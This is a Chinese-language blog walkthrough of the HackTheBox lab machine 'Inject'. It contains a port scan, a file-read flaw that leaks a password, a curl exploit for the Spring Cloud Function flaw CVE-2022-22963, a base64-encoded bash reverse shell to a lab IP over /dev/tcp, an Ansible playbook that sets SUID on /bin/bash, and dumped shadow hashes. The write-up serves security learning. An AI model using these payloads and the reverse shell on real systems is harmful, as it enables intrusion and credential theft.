---
title: Inject - HackTheBox
url: https://darkwing.moe/2023/03/13/Inject-HackTheBox/
source: 喵喵喵喵
date: 2023-03-14
fetch_date: 2025-10-04T09:27:48.605299
---

# Inject - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Inject - HackTheBox

# Inject - HackTheBox

##### 2023-03-13

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 8080](#8080)
3. [3. LFI](#LFI)
   1. [3.1. /home/frank/.m2/settings.xml](#home-frank-m2-settings-xml)
   2. [3.2. pom.xml](#pom-xml)
4. [4. CVE-2022-22963](#CVE-2022-22963)
   1. [4.1. exploit](#exploit)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. miao.yml](#miao-yml)
   2. [7.2. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Inject - HackTheBox

2023-03-13

# 基本信息

* <https://app.hackthebox.com/machines/533>
* **10.10.11.204**

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031301.jpg)

# 端口扫描

22和8080:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.204 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 11:15 CST Nmap scan report for 10.10.11.204 Host is up (0.10s latency). Not shown: 998 closed tcp ports (conn-refused) PORT     STATE SERVICE     VERSION 22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) |   256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 8080/tcp open  nagios-nsca Nagios NSCA |_http-open-proxy: Proxy might be redirecting requests |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds ``` |

## 8080

一个类似云盘的东西：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031302.jpg)

# LFI

简单测试上传查看，发现可能存在LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031303.jpg)

验证存在：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031304.jpg)

并且可以直接查看目录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031305.jpg)

## /home/frank/.m2/settings.xml

读文件，得到phil的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` <?xml version="1.0" encoding="UTF-8"?> <settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">   <servers>     <server>       <id>Inject</id>       <username>phil</username>       <password>DocPhillovestoInject123</password>       <privateKey>${user.home}/.ssh/id_dsa</privateKey>       <filePermissions>660</filePermissions>       <directoryPermissions>660</directoryPermissions>       <configuration></configuration>     </server>   </servers> </settings> ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031306.jpg)

但并不能直接直接SSH登录

## pom.xml

找到应用目录，读取pom，发现存在漏洞的组件：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031307.jpg)

* me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963
  <https://github.com/me2nuk/CVE-2022-22963>

# CVE-2022-22963

测试存在：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031308.jpg)

## exploit

Java runtime exec需要编码处理，得到frank用户 shell

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` bash -i &>/dev/tcp/10.10.14.4/4444 <&1  bash -c {echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=}|{base64,-d}|{bash,-i}  curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=}|{base64,-d}|{bash,-i}")' --data-raw 'data' -v ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031309.jpg)

# user flag

现在可以使用密码切换到phil用户，得到user flag:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031310.jpg)

# 提权信息

定期使用ansible运行指定目录下的playbook，原本的playbok我们没有权限，但我们在staff组中，对tasks目录有写权限，所以可以直接创建新的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031311.jpg)

# 提权 & root flag

自定义一个playbook执行任意命令，等待触发：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023031312.jpg)

## miao.yml

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` - hosts: localhost   tasks:     - name: PE       ansible.builtin.shell: |         chmod +s /bin/bash       become: true ``` |

## shadow

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` root:$6$KeHoGfvAPeHOqplu$tC/4gh419crGM6.btFzCazMPFH0gaX.x/Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7::: frank:$6$fBwyjkLHtSuUCpHx$6G9LujV0iop.QxbfQpwDcSaRWDDobBlVMo5.6gVJVnQabcbmFwdkwFfmJNAX27u3Cdg9ZO5977pCst7hF98kc/:19381:0:99999:7::: phil:$6$Z.KhzrHH6PXCuNbO$dL9xyMTydwjYPcrunZb7OO9a0hCwrUPOeQfdum818rW4NPtsiXEji15NMmikgYBGLDbWPUfLIpCpOuCRxYedM.:19388:0:99999:7::: ``` |

# 参考资料

* me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963
  <https://github.com/me2nuk/CVE-2022-22963>
* Inject - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Inject-HTB-Discussion>

> Last updated: 2023-07-10 08:56:34
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Cerberus - HackTheBox](/2023/03/22/Cerberus-HackTheBox/)

[Next

#### Agile - HackTheBox](/2023/03/06/Agile-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)